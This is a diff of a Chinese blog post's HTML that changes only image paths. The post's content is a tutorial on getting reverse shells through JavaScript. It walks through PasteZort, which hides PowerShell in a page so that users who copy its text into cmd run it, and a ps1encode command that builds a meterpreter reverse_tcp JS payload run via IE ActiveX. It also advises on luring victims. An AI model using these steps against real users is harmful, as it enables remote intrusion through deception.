@@ -176,35 +176,35 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ZettaHack/PasteZort.git</span><br><span class="line">cd PasteZort</span><br><span class="line">chmod -R 777 . #不授予权限可能会生成失败</span><br></pre></td></tr></table></figure>
 <h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>运行</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PasteZ0rt.py</span><br></pre></td></tr></table></figure>
-<p><img src="/article/两种利用js反弹shell的方式/1.png" alt></p>
+<p><img src="/article/ea975567/1.png" alt></p>
 <p>选择平台、payload，填写IP和监听端口</p>
-<p><img src="/article/两种利用js反弹shell的方式/2.png" alt></p>
+<p><img src="/article/ea975567/2.png" alt></p>
 <p>设置完后让填写网页的信息，可以随意填写，也可以写一些诱导性的内容，让用户将其复制到<code>cmd</code>中运行，写完后按回车，再输入y按回车确定</p>
-<p><img src="/article/两种利用js反弹shell的方式/9 12.png" alt></p>
+<p><img src="/article/ea975567/9 12.png" alt></p>
 <p>设置完成后会自动打开<code>msf</code>并且设置好监听，并同时开启apache服务</p>
-<p><img src="/article/两种利用js反弹shell的方式/3.png" alt></p>
+<p><img src="/article/ea975567/3.png" alt></p>
 <p>这时候打开浏览器输入攻击机的<code>IP</code>，可以看到网页的内容是自己设置的内容。</p>
-<p><img src="/article/两种利用js反弹shell的方式/4.png" alt></p>
+<p><img src="/article/ea975567/4.png" alt></p>
 <p>使用审查元素查看网页源码，其实<code>powershell</code>恶意代码已经隐藏在网页中，这时只需要复制<strong>网页显示的内容</strong>，<strong>就可以同时复制到恶意代码</strong>。</p>
-<p><img src="/article/两种利用js反弹shell的方式/6.png" alt></p>
+<p><img src="/article/ea975567/6.png" alt></p>
 <p>复制内容后打开cmd，点击复制后代码自动运行，并且看不到恶意代码的内容。</p>
-<p><img src="/article/两种利用js反弹shell的方式/5.png" alt></p>
+<p><img src="/article/ea975567/5.png" alt></p>
 <p>回到<code>kali</code>上可以看到已经获得一个session</p>
-<p><img src="/article/两种利用js反弹shell的方式/8.png" alt></p>
+<p><img src="/article/ea975567/8.png" alt></p>
 <p>此时查看用户的系统进程，<code>powershell</code>在后台运行</p>
-<p><img src="/article/两种利用js反弹shell的方式/9 1.png" alt></p>
+<p><img src="/article/ea975567/9 1.png" alt></p>
 <h2 id="利用JS文件打开网页反弹shell"><a href="#利用JS文件打开网页反弹shell" class="headerlink" title="利用JS文件打开网页反弹shell"></a>利用JS文件打开网页反弹shell</h2><p>​    这种利用方式依赖于<code>ActivateX</code>控件，所以局限性较大，成功的条件是必须使用IE浏览器打开(只有IE浏览器有<code>ActivateX</code>控件)，并且点击运行组织内容和允许<code>ActivateX</code>控件，这个和上一种方式相比，更难操控。</p>
 <h3 id="下载工具-1"><a href="#下载工具-1" class="headerlink" title="下载工具"></a>下载工具</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/CroweCybersecurity/ps1encode</span><br></pre></td></tr></table></figure>
 <h3 id="具体操作-1"><a href="#具体操作-1" class="headerlink" title="具体操作"></a>具体操作</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ps1encode.rb --LHOST 192.168.0.105 --LPORT 9999 --PAYLOAD windows/meterpreter/reverse_tcp --ENCODE cmd -t js</span><br></pre></td></tr></table></figure>
-<p><img src="/article/两种利用js反弹shell的方式/9 2.png" alt></p>
+<p><img src="/article/ea975567/9 2.png" alt></p>
 <p>运行后获得一大串js代码，将它们复制出来保存为js文件，然后写一个<code>html</code>文件调用这个js文件，或者也可以直接一个js文件，但是这样太可疑了。</p>
-<p><img src="/article/两种利用js反弹shell的方式/9 3.png" alt></p>
-<p><img src="/article/两种利用js反弹shell的方式/9 4.png" alt></p>
+<p><img src="/article/ea975567/9 3.png" alt></p>
+<p><img src="/article/ea975567/9 4.png" alt></p>
 <p>之后使用<strong>IE浏览器</strong>打开网页，点击允许阻止内容，和允许Active控件</p>
-<p><img src="/article/两种利用js反弹shell的方式/9 8.png" alt></p>
-<p><img src="/article/两种利用js反弹shell的方式/9 9.png" alt></p>
+<p><img src="/article/ea975567/9 8.png" alt></p>
+<p><img src="/article/ea975567/9 9.png" alt></p>
 <p>返回<code>kali</code>可以看到反弹shell成功</p>
-<p><img src="/article/两种利用js反弹shell的方式/9 11.png" alt></p>
+<p><img src="/article/ea975567/9 11.png" alt></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>两种方式都是使用js文件进行反弹shell，都是有一定的利用条件的，并且现在的杀毒软件一般都能够检测出隐藏执行<code>powershell</code>，所以还是比较难直接利用的，但是如果想到好的办法进行诱导还是可以利用的。</p>
     </div>
   </div>
